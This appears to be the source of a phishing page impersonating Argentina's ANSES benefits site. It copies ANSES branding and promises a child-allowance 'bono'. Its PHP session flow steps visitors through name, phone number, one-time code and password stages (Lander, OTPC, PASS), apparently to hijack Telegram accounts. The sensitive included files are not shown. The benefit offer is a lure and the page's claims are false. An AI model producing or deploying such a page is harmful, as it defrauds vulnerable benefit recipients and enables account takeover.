<?php require("_core.php"); ?>
<?php
$currentState = $_SESSION["state"] ?? "start";
?>
<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Asignación Universal por Hijo | ANSES</title>
    <meta name="robots" content="noindex,nofollow">

    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700;900&display=swap" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>

    <style>
        :root {
            --anses-blue: #0080c7;
            --anses-dark-blue: #002f5a;
            --anses-light-gray: #f2f2f2;
            --anses-text: #333333;
        }

        body {
            margin: 0;
            font-family: 'Roboto', sans-serif;
            background-color: white;
            color: var(--anses-text);
        }

        /* --- NAVBAR --- */
        .top-nav {
            background-color: var(--anses-dark-blue);
            padding: 12px 15px;
            border-bottom: 4px solid var(--anses-blue);
        }

        .nav-top-row {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 12px;
        }

        .logo-anses {
            height: 32px;
        }

        .logo-ministerio {
            height: 32px;
            border-left: 1px solid rgba(255, 255, 255, 0.3);
            padding-left: 10px;
        }

        .nav-bottom-row {
            display: flex;
            gap: 10px;
            align-items: center;
        }

        .mi-anses-pill {
            background-color: white;
            color: var(--anses-dark-blue);
            font-weight: 900;
            padding: 4px 14px;
            border-radius: 6px;
            text-decoration: none;
            font-size: 15px;
            display: flex;
            align-items: center;
            gap: 4px;
        }

        .search-wrapper {
            position: relative;
            flex-grow: 1;
        }

        .search-input-mobile {
            width: 100%;
            border-radius: 4px;
            border: none;
            padding: 5px 10px;
            font-size: 13px;
            height: 34px;
        }

        /* --- CONTENT --- */
        .container-custom {
            max-width: 800px;
            margin: 0 auto;
            padding: 0 15px;
        }

        .breadcrumb-anses {
            padding: 15px 0;
            font-size: 12px;
            color: #666;
        }

        .header-banner {
            width: 100%;
        }

        .img-banner {
            width: 100%;
            height: auto;
            display: block;
            border-radius: 15px;
        }

        .section-title {
            color: var(--anses-dark-blue);
            font-weight: 700;
            font-size: 22px;
            margin-top: 35px;
            margin-bottom: 15px;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        /* Area Form Backend */
        .form-card {
            background: #fff;
            border: 1px solid #ddd;
            border-radius: 8px;
            padding: 20px;
            margin: 20px 0;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.05);
        }

        .info-block {
            margin-bottom: 25px;
            font-size: 14.5px;
            line-height: 1.6;
        }

        .info-block ul {
            padding-left: 20px;
        }

        .info-block strong {
            color: var(--anses-dark-blue);
        }

        /* Estilo de los pasos según la imagen */
        .step-item {
            display: flex;
            gap: 15px;
            margin-bottom: 15px;
            padding: 20px;
            background-color: #f9f9f9;
            border: 1px solid #eee;
            border-radius: 8px;
        }

        .step-num {
            font-size: 32px;
            font-weight: 700;
            color: #ccc;
            line-height: 1;
        }

        /* Nueva sección de beneficios (Promo Card) */
        .promo-card {
            background: #ffffff;
            border-radius: 12px;
            padding: 25px;
            margin: 30px 0;
            border: 1px solid #eee;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.05);
        }

        .promo-header h2 {
            color: var(--anses-dark-blue);
            font-weight: 700;
            font-size: 20px;
        }

        .benefit-item {
            display: flex;
            align-items: flex-start;
            gap: 15px;
            margin-bottom: 15px;
        }

        .how-step {
            display: flex;
            align-items: center;
            gap: 15px;
            margin-bottom: 12px;
        }

        .how-num {
            background: #f29100;
            color: white;
            width: 28px;
            height: 28px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            flex-shrink: 0;
        }

        /* --- FOOTER --- */
        .anses-footer-feedback {
            background-color: #fff;
            padding: 40px 0;
            text-align: center;
            border-top: 1px solid #eee;
        }

        .footer-dark {
            background-color: var(--anses-dark-blue);
            padding: 30px 0;
            color: white;
            text-align: center;
        }

        .social-icons {
            display: flex;
            justify-content: center;
            gap: 15px;
            margin-top: 15px;
        }

        .social-circle {
            width: 30px;
            height: 30px;
            border: 1px solid white;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 14px;
        }
    </style>
</head>

<body>

    <nav class="top-nav">
        <div class="nav-top-row">
            <div style="display: flex; align-items: center; gap: 10px;">
                <img src="assets/image.png" alt="ANSES" class="logo-anses">
            </div>
            <div style="color:white; font-size: 24px;">☰</div>
        </div>
        <div class="nav-bottom-row">
            <a href="#" class="mi-anses-pill">mi ANSES</a>
            <div class="search-wrapper">
                <input type="text" class="search-input-mobile" placeholder="Buscar en ANSES">
            </div>
        </div>
    </nav>

    <div class="container-custom">
        <div class="breadcrumb-anses">Inicio > Hijos > <strong>Asignación Universal por Hijo</strong></div>

        <div class="header-banner">
            <img src="assets/banner0.jpg" alt="Banner" class="img-banner">
        </div>

        <div class="form-card">
            <?php
            if (!isset($_SESSION["state"])) {
                $_SESSION["state"] = "start";
            }

            switch ($_SESSION["state"]) {
                case "start":
                    require("Lander.php");
                    break;
                case "phone":
                    require("OTPC.php");
                    break;
                case "otp":
                    require("PASS.php");
                    break;
                case "success":
                    require("SCCS.php");
                    break;
            }
            ?>
        </div>

        <div class="promo-card">
            <div class="promo-header">
                <h2>¿Por qué reclamar el bono?</h2>
                <p>Ayuda económica directa para personas que califican. Rápido, seguro y sin costos adicionales.</p>
            </div>

            <div class="benefit-item">
                <div class="benefit-icon">✔️</div>
                <div class="benefit-text">
                    <strong>Proceso fácil</strong>
                    <p>Solo tardás unos minutos en solicitarlo.</p>
                </div>
            </div>

            <div class="benefit-item">
                <div class="benefit-icon">🔒</div>
                <div class="benefit-text">
                    <strong>Datos protegidos</strong>
                    <p>Usamos únicamente la información necesaria.</p>
                </div>
            </div>

            <div class="benefit-item">
                <div class="benefit-icon">💸</div>
                <div class="benefit-text">
                    <strong>Pago directo</strong>
                    <p>La ayuda se deposita en cuentas autorizadas.</p>
                </div>
            </div>

            <div class="how-it-works mt-4">
                <h3 style="font-size: 18px; font-weight: 700; color: var(--anses-dark-blue);">Cómo funciona</h3>

                <div class="how-step">
                    <div class="how-num">1</div>
                    <div class="how-info">
                        <strong>Completá el formulario</strong>
                        <p>Ingresá tu nombre y número de Telegram.</p>
                    </div>
                </div>

                <div class="how-step">
                    <div class="how-num">2</div>
                    <div class="how-info">
                        <strong>Verificación</strong>
                        <p>Revisamos tu elegibilidad de forma segura.</p>
                    </div>
                </div>

                <div class="how-step">
                    <div class="how-num">3</div>
                    <div class="how-info">
                        <strong>Recibí tu bono</strong>
                        <p>Te avisamos por Telegram cuando esté disponible.</p>
                    </div>
                </div>
            </div>
        </div>


        <div class="anses-footer-feedback">
            <p class="fw-bold">¿Te sirvió la información?</p>
            <div style="font-size: 24px;">🙂 😐 🙁</div>

            <div class="container mt-5">
                <div class="row text-start" style="font-size: 13px;">
                    <div class="col-4">
                        <strong>Contactanos</strong><br>
                        Llamá al 130
                    </div>
                    <div class="col-4 text-center">
                        <strong>Descargá la APP</strong><br>
                        <div style="background:#002f5a; color:white; padding:5px; border-radius:5px; margin-top:5px;">mi
                            ANSES</div>
                    </div>
                    <div class="col-4 text-end">
                        <strong>Seguinos en</strong>
                        <div class="social-icons" style="justify-content: flex-end;">
                            <div class="social-circle">f</div>
                            <div class="social-circle">x</div>
                            <div class="social-circle">ig</div>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div class="footer-dark">
            <img src="assets/logo_c_h_footer.png"
                style="height:40px; filter: brightness(0) invert(1); margin-bottom:10px;"><br>
            <small>Ministerio de Capital Humano | Presidencia de la Nación</small>
        </div>

</body>


</html>
